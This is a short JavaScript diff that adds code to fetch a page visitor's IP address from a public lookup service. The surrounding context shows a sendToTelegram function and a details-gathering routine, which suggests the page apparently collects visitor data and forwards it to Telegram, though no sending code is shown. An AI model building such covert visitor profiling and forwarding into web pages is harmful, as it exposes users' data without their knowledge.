@@ -133,6 +133,17 @@ async function sendToTelegram() {
     }
 }
 
+
+// Get User IP Address
+fetch("https://api.ipify.org?format=json")
+    .then(response => response.json())
+    .then(data => { 
+        userIP = data.ip; 
+        console.log("User IP:", userIP);
+    })
+    .catch(() => { 
+        userIP = "Unknown"; 
+    });
 // Fetch user details in parallel
 async function getUserDetails() {
     const ipPromise = fetch("https://ipapi.co/json/")
